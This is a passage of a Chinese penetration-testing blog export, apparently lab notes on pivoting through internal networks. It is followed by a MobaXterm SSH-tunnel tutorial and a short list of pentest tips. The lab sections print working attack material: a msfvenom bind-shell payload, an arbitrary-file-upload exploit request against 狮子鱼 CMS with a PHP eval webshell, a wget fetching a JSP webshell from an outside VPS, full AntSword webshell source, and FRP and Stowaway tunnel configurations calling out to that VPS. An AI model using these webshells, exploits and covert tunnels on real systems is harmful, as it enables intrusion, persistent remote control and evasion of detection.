还需要注意的是，我们公网VPS通过代理可以访问内网target2，但是呢target2并不可以出网！！！</p><ul><li>msfvenom 生成正向连接 payload</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind\_tcp lport=7878 -f exe -o bind7878.exe</span><br></pre></td></tr></table></figure><ul><li>上传到 target2 并执行</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start bind7878.exe</span><br></pre></td></tr></table></figure><ul><li>MSF添加正向连接监听器</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/bind\_tcp -H 192.168.2.242 -P 7878</span><br></pre></td></tr></table></figure><p>反弹回 target2 的 meterpreter shell</p><h3 id="添加到33网段的路由"><a href="#添加到33网段的路由" class="headerlink" title="-添加到33网段的路由"></a>-添加到33网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -s 192.168.3.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">这样子才会将数据转发到target2的meterpreter </span><br></pre></td></tr></table></figure><h3 id="代理nmap扫描Target3"><a href="#代理nmap扫描Target3" class="headerlink" title="-代理nmap扫描Target3"></a>-代理nmap扫描Target3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxychains nmap –sT –Pn –n –T4 192.168.3.180</span><br><span class="line">开放端口：21/22/80/135/139/445/8888</span><br><span class="line">操作系统：linux</span><br></pre></td></tr></table></figure><p>80端口：狮子鱼cms</p><h3 id="狮子鱼cms任意文件上传拿shell"><a href="#狮子鱼cms任意文件上传拿shell" class="headerlink" title="-狮子鱼cms任意文件上传拿shell"></a>-狮子鱼cms任意文件上传拿shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"></span><br><span class="line">POST </span><br><span class="line">/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: 192.168.3.180</span><br><span class="line">Content-Type: multipart/form-data; boundary=----</span><br><span class="line">WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Length: 204</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Connection: close</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;files&quot;; </span><br><span class="line">filename=&quot;mm.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">&lt;?php eval($_POST[&#x27;pwd&#x27;]);?&gt;</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210210599.png" alt="image-20220921021014377"></p><blockquote><p><a href="http://192.168.3.180/Common/image/uploads/1652168710238.php">http://192.168.3.180/Common/image/uploads/1652168710238.php</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210235766.png" alt="image-20220921021039518"></p><h1 id="Socks代理实战二-FRP"><a href="#Socks代理实战二-FRP" class="headerlink" title="Socks代理实战二(FRP)"></a>Socks代理实战二(FRP)</h1><p>代理工具 搭建较好用的代理通道</p><blockquote><p><a href="https://gofrp.org/docs/examples/vhost-http/">https://gofrp.org/docs/examples/vhost-http/</a>文档</p></blockquote><h2 id="渗透Target1-1"><a href="#渗透Target1-1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><p>我们已经通过shiro拿到shiro的shell，我们进一步拿到反弹shell，拿到一个可执行命令的shell</p><h3 id="拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录"><a href="#拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录" class="headerlink" title="-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录"></a>-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line">cd /usr/tomcat/apache-tomcat-8.5.0/webapps/sh</span><br><span class="line">wget http://124.223.217.243:8000/9999.jsp</span><br></pre></td></tr></table></figure><p>冰蝎：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236736.png" alt="image-20220921023618509"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236830.png" alt="image-20220921023622619"></p><p>蚁剑shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) </span><br><span class="line">decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li>2.内存 shell</li></ul><blockquote><p><a href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236936.png" alt="image-20220921023649681"></p><p>注入内存马 ，注入之后即可连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:38080/sh/xxx?ver=aaaaaa</span><br><span class="line">pwd：2zhl</span><br><span class="line">连接类型：CUSTOM（自定义类型）</span><br><span class="line">请求信息：（header）注意要带上请求头</span><br><span class="line">Accept-Header</span><br><span class="line">thisIsMyJob!@</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210237704.png" alt="image-20220921023717454"></p><p>正常连接并执行命令：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210238087.png" alt="image-20220921023748386"></p><h2 id="FRP建立Socks代理"><a href="#FRP建立Socks代理" class="headerlink" title="FRP建立Socks代理"></a>FRP建立Socks代理</h2><ul><li>1.VPS：124.233.217.243</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line"></span><br><span class="line">              ./frps   s表示服务端</span><br><span class="line">                                    ./frpc   c表示客户端</span><br><span class="line">                                    -c       指定配置文件</span><br><span class="line">默认frps启动在7000端口，如果要修改启动端口就-c指定配置文件</span><br><span class="line">先要修改配置</span><br><span class="line">cat frps_vps.ini</span><br><span class="line">[common]                 =====&gt;[]内的是注释内容 不会生效</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>2.target1：192.168.2.151</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc –c frpc_1.ini</span><br><span class="line"> ps -elf |grep frpc查看进程是否启动</span><br><span class="line"> 命令执行完成后，会和我们服务端建立连接</span><br><span class="line"> 并生成socks5代理在10088端口</span><br><span class="line">写入配置文件</span><br><span class="line"></span><br><span class="line">cat frpc_1.ini </span><br><span class="line">[common]           </span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]        搭建了一个socks5的代理</span><br><span class="line">type = tcp        流量类型是tcp，如果要代理http改为http即可                </span><br><span class="line">plugin = socks5            ，如果要启用socks5代理，就要使用此socks5的插件</span><br><span class="line">remote_port = 10088        即socks代理开启在哪个端口，并注意在sockschains上也要修改对应端口</span><br></pre></td></tr></table></figure><ul><li>2.验证socks代理</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用proxychins连接我们的socks代理之前需要先去配置端口</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">[ProxyList]</span><br><span class="line"># add proxy here ...</span><br><span class="line"># meanwile</span><br><span class="line"># defaults set to &quot;tor&quot;</span><br><span class="line">#socks4         127.0.0.1 9050</span><br><span class="line">#socks5         127.0.0.1 1080</span><br><span class="line">socks5          127.0.0.1 10088</span><br><span class="line"></span><br><span class="line">proxychains4 nmap -sT -Pn -T4 -n 192.168.2.242</span><br></pre></td></tr></table></figure><h2 id="FRP建立二层Socks代理"><a href="#FRP建立二层Socks代理" class="headerlink" title="FRP建立二层Socks代理"></a>FRP建立二层Socks代理</h2><p>先要拿下target2的shell，蚁剑</p><p>再搭建二层代理将我们target2的请求转发给target3</p><ul><li>1.VPS：124.223.217.243</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps_vps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>2.Target1：192.168.2.151</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先杀掉原先的进程</span><br><span class="line">ps -elf |grep frpc</span><br><span class="line">kill id</span><br><span class="line">在target1，要重新启动一个frp，指定新的配置文件如下！</span><br><span class="line">./frpc -c frpc_11.ini</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 124.223.217.243</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10088</span><br><span class="line">plugin = socks5</span><br><span class="line">[socks5_to_3]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 10089</span><br><span class="line">remote_port = 10090</span><br><span class="line"></span><br><span class="line">以上的配置会在服务端启动两个代理服务器，一个在10088端口 一个在10090</span><br><span class="line">在proxychains上，联系target2走10088，联系target3走10090</span><br><span class="line">[socks5_to_2]是到二网段的一个配置，负责沟通VPS与本机target2的联系，与上面的配置实际上是一样的</span><br><span class="line">[socks5_to_3]是到三网段</span><br><span class="line">[socks5_to_3]做的就是一个端口转发的配置</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1            本地</span><br><span class="line">local_port = 10089             告诉我们本地有一个监听端口10089  </span><br><span class="line">remote_port = 10090            告诉我们的VPS要监听一个10090端口</span><br><span class="line">这个地方做的一个事情就是端口转发的事情，将本地10089端口的内容转发到公网10090端口</span><br><span class="line">意思就是我们在公网访问vps的10090就相当于访问内网的10089端口！！！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再开启一个server端，供client端连接，建立socks代理连接</span><br><span class="line">./frps -c frps_1.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><ul><li>3.Target2：192.168.3.190</li></ul><p>先上传我们的工具frp_win</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frpc.exe -c frpc_2.ini</span><br><span class="line">tasklist | findstr frpc验证进程</span><br><span class="line">taskkill /pid pid /f强制杀掉一个已存在的进程</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.151</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 10089</span><br></pre></td></tr></table></figure><p>4.验证socks代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sT -Pn -T4 -n 192.168.3.180</span><br></pre></td></tr></table></figure><h1 id="Socks代理实战三-Stowaway"><a href="#Socks代理实战三-Stowaway" class="headerlink" title="Socks代理实战三(Stowaway)"></a>Socks代理实战三(Stowaway)</h1><p>适合多层的网络环境，frp简单一点的还可以，复杂了就不太稳定</p><p>frp文件比较大，通过层层代理传输进动静会比较大，对网络的要求也比较高</p><p>stowaway树状连接节点会方便很多</p><h2 id="Stowaway简介"><a href="#Stowaway简介" class="headerlink" title="Stowaway简介"></a>Stowaway简介</h2><blockquote><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p></blockquote><p>Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具</p><p>用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul><li>节点: 指 admin || agent</li><li>主动模式: 指当前操作的节点主动连接另一个节点</li><li>被动模式: 指当前操作的节点监听某个端口，等待另一个节点连接</li><li>上游: 指当前操作的节点与其父节点之间的流量</li><li>下游：指当前操作的节点与其所有子节点之间的流量</li></ul><h2 id="Stowaway使用说明"><a href="#Stowaway使用说明" class="headerlink" title="Stowaway使用说明"></a>Stowaway使用说明</h2><p>Stowaway分为两个角色,分别是：</p><ul><li>admin 渗透测试者使用的主控端</li><li>agent 渗透测试者部署的被控端</li></ul><h3 id="admin"><a href="#admin" class="headerlink" title="-admin"></a>-admin</h3><ul><li>admin 用法：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; ./stowaway_admin -l &lt;port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --rhostreuse</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password] --rhostreuse</span><br></pre></td></tr></table></figure><ul><li>admin 参数：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure><ul><li>admin 主 panel 选项：（admin面板，连接后可以执行哪些操作）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(admin) &gt;&gt; help</span><br><span class="line">  help                                          显示帮助信息</span><br><span class="line">  detail                                        展示在线节点的详细信息</span><br><span class="line">  topo                                          展示在线节点的父子关系，拓扑图</span><br><span class="line">  use        &lt;id&gt;                               选择你要使用的目标节点</span><br><span class="line">  exit                                          退出 Stowaway</span><br></pre></td></tr></table></figure><ul><li>admin node panel 选项：(node面板 对node执行的操作）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(node 0) &gt;&gt; help</span><br><span class="line"> help                                            显示帮助信息</span><br><span class="line"> listen                                          开始监听当前节点的端口</span><br><span class="line"> addmemo    &lt;string&gt;                             为当前节点添加备忘录</span><br><span class="line"> delmemo                                         删除当前节点的备忘录</span><br><span class="line"> ssh        &lt;ip:port&gt;                            通过当前节点启动SSH</span><br><span class="line"> shell                                           在当前节点上启动一个交互式shell</span><br><span class="line"> socks      &lt;lport&gt; [username] [pass]            启动一个socks5服务器</span><br><span class="line"> stopsocks                                       关闭socks服务</span><br><span class="line"> connect    &lt;ip:port&gt;                            连接到一个新节点</span><br><span class="line"> sshtunnel  &lt;ip:sshport&gt; &lt;agent port&gt;            使用sshtunnel将节点添加到我们的拓扑结构中</span><br><span class="line"> upload     &lt;local filename&gt; &lt;remote filename&gt;   上传文件到当前节点</span><br><span class="line"> download   &lt;remote filename&gt; &lt;local filename&gt;   从当前节点下载文件</span><br><span class="line"> forward    &lt;lport&gt; &lt;ip:port&gt;                    转发本地端口到特定的远程 ip:port</span><br><span class="line"> stopforward                                     关闭转发服务</span><br><span class="line"> backward    &lt;rport&gt; &lt;lport&gt;                     将远程端口(agent)映射到本地端口(admin)。与forward相反</span><br><span class="line"> stopbackward                                    关闭backward服务</span><br><span class="line"> shutdown                                        终止当前节点</span><br><span class="line"> back                                            返回到父面板</span><br><span class="line"> exit                                            退出Stowaway</span><br></pre></td></tr></table></figure><h3 id="agent"><a href="#agent" class="headerlink" title="-agent"></a>-agent</h3><ul><li>agent 参数:</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--reconnect 重连时间间隔</span><br><span class="line">--rehost 端口复用时复用的IP地址</span><br><span class="line">--report 端口复用时复用的端口号</span><br><span class="line">--up 上游协议类型,默认为裸TCP流量,可选HTTP</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure><h2 id="建立一层socks代理"><a href="#建立一层socks代理" class="headerlink" title="建立一层socks代理"></a>建立一层socks代理</h2><ul><li>在VPS上开启监听（也可以是target监听，vps用connect命令，主动连接添加节点)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_admin -l 9999 -s hack</span><br><span class="line">开启监听等待其他节点连接</span><br><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br></pre></td></tr></table></figure><ul><li>Target1</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/stowaway_agent -c 47.101.214.85:9999 -s hack</span><br><span class="line">主动连接admin，连接后target1是node id =0</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">-s 节点通信加密密钥</span><br></pre></td></tr></table></figure><ul><li>进入Target1的node节点，开启socks代理</li></ul><p>注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243293.png" alt="image-20220921024307025"></p><ul><li>测试socks代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243699.png" alt="image-20220921024315473"></p><h2 id="建立二层socks代理"><a href="#建立二层socks代理" class="headerlink" title="建立二层socks代理"></a>建立二层socks代理</h2><ul><li>首先在 node 0 中开启监听</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">listen        在target1开启监听7070端口，让target2连接上target1，这个命令是在vps上执行的</span><br><span class="line">1</span><br><span class="line">7070        []表示可选，&lt;&gt;表示必选</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243114.png" alt="image-20220921024349881"></p><p>在 Target1 上可以看到 agent 监听了 7070 端口</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244465.png" alt="image-20220921024401182"></p><ul><li>在 Target2 中连接 Target1 监听的 7070 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_agent -c 192.168.2.151:7070 -s hack</span><br><span class="line">主动连接</span><br><span class="line">use 1</span><br><span class="line">socks 1088           </span><br><span class="line">样开启socks 1088端口，注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</span><br></pre></td></tr></table></figure><ul><li>admin 接收到新的 node 1 , 进入 node 1 节点开启 socks 代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244010.png" alt="image-20220921024419783"></p><ul><li>测试代理</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244486.png" alt="image-20220921024426178"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 内网代理隧道搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> socks5 </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MobaXterm教程</title>
      <link href="/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/MobaXterm%E6%95%99%E7%A8%8B/"/>
      <url>/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/MobaXterm%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="MobaXterm配置SSHTunnel"><a href="#MobaXterm配置SSHTunnel" class="headerlink" title="MobaXterm配置SSHTunnel"></a>MobaXterm配置SSHTunnel</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>我们在使用公有云的时候，不论是安全的原因，还是省钱的原因，都经常只购买一个弹性公网IP。除了绑定公网IP的云服务器可以直接从外网访问外，其它的服务器，要么通过登录公有云提供商的网页控制台，从网页远程登录；要么只有先登录绑定公网IP的服务器，然后再ssh到目标服务上。当然，如果买了堡垒机的土豪除外。<br>以上的两种方法，使用都不怎么方便。其实不论是putty，还是MobaXterm，都提供了SSHTunnel的功能，为我们日常管理，提供了很简便的解决方案。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li><p>菜单Tools——MobaSSHTunnel（port forwarding），出现如下界面：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142761.png" alt="ssh隧道配置" title="ssh隧道配置"></p></li><li><p>上图的左下角,”My computer with MobaXterm”里, &lt;forward port&gt;填入本地计算机空闲端口, 比如65432</p></li><li><p>上图的右下角,”SSH server”里,需要填入三个信息: &lt;ssh server&gt;填写弹性公网IP, &lt;ssh login&gt;填写绑定公网IP的服务器用于登录的用户名,比如root,&lt;ssh port&gt;里一般填写22, 如果你有修改了sshd监听的端口, 那么就填写修改后的端口</p></li><li><p>上图的右上角,”Remote server”里, &lt;remote server&gt;填写需要登录的服务器的私有ip地址,比如192.168.0.168, &lt;remote port&gt;里一般填写22, 如果你有修改了sshd监听的端口, 那么就填写修改后的端口</p></li><li><p>点击”Save”, SSHTunnel就配置好了</p></li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142724.png" alt="ssh隧道配置" title="ssh隧道配置"></p><p>如上图, 点击”start&#x2F;stop”的start图标, 输入绑定公网IP的服务器的登录用户名对应的密码, ssh隧道就建立了.<br>接下来,我们新建一个Session,如下图:</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210142692.png" alt="新建session" title="新建session"></p><p>注意红色方框标识出来的部分,”Remote host”必须填写<em>localhost</em>或者<em>127.0.0.1</em>, “Port”必须填写我们在第2步里&lt;forward port&gt;填写的端口.<br>然后就可以跟以前一样正常使用了.</p><p>就相当于走了代理去访问远程的ssh</p><h1 id="refer"><a href="#refer" class="headerlink" title="refer:"></a>refer:</h1><blockquote><p><a href="http://www.fobgavin.com/mobaxterm-instruction-1.html">MobaXterm详细使用教程（一）</a></p><p><a href="https://okrs.gitee.io/blog/2020/04/26/019ssh-tunnel/">MobaXterm配置SSHTunnel</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MobaXterm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场三</title>
      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><blockquote><p><a href="https://11pmsleep.github.io/2022-09-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98/">0x26 - Socks 代理实战</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试要点</title>
      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E7%BB%93/"/>
      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209211812304.png" alt="渗透测试流程"></p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li><p>少用msf17010，动静大，容易把主机打崩，渗透测试尽量要动静小，获取到的主机资产要多，如果直接打崩了就少了个资产。在内网要动静小一点，才能更加的隐蔽</p></li><li><p>内网隧道搭建如果不稳定，就要从msf或者cs的代理转向上传frp或者stowaway进行隧道代理搭建。cs的代理比较少用，老版cs不支持socks5，如果追求稳定还是使用之前学习过的代理工具！！！~~~</p><p>比较推荐的是stowaway</p></li><li><p>上传工具的话。动静还是有的，一些工具需要环境比如python。而且工具容易被杀被检测！有的工具稍微大一点，经过代理上传会导致动静非常大。</p></li><li><p>内网扫描的话fscan不错</p></li><li><p>dirb kali中很好用的一个目录扫描工具</p></li><li><p>尝试学习写漏洞检测脚本</p></li><li><p>GitHub搜poc，学习知识后，要自己输出知识</p></li><li><p>要了解爆出来的漏洞，了解怎么利用，怎么发现，对他先有一个认知，不一定需要一下子就知道底层原理。先了解怎么利用，再决定要不要了解底层原理。一定要自己动手去复现漏洞。历史漏洞主要还是靠我们自主学习。另外，历史漏洞有很多，不求全部掌握，但求掌握最新爆出来的漏洞。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场二</title>
      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">218.76.8.99:2880 --&gt; 10.30.1.164:80</span><br><span class="line">218.76.8.99:2822 --&gt; 10.30.1.125:22</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">外网</span></span><br><span class="line">Attacker_Kali：218.76.8.99:2822</span><br><span class="line">10.30.1.125</span><br><span class="line">192.168.1.181</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">172.26.8.84</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一层</span></span><br><span class="line">WEB-Joomla-Win7：218.76.8.99:2880</span><br><span class="line">10.30.1.140</span><br><span class="line">172.26.8.114</span><br><span class="line">192.168.1.141</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内网</span></span><br><span class="line">域：mingy.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二层</span></span><br><span class="line">域内：Weblogic-wls9-win7</span><br><span class="line">192.168.1.28</span><br><span class="line">10.10.10.105</span><br><span class="line"><span class="meta 